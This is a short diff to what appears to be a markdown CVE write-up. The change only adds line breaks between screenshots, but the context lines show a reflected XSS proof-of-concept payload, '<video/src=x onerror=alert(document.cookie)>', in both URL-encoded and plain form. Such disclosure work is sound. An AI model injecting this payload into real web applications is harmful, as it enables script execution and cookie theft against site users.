@@ -41,4 +41,6 @@ keyword=%3Cvideo/src=x%20onerror=alert(document.cookie)%3E%20
 <video/src=x onerror=alert(document.cookie)>
 ```
 ![1-1](https://github.com/h4md153v63n/CVEs/assets/5091265/85674d4d-34f4-4dc3-95b4-b010401dd04e)
+<br>
+<br>
 ![1-2](https://github.com/h4md153v63n/CVEs/assets/5091265/5225831f-4eef-41df-bd4e-c9e41901dce0)
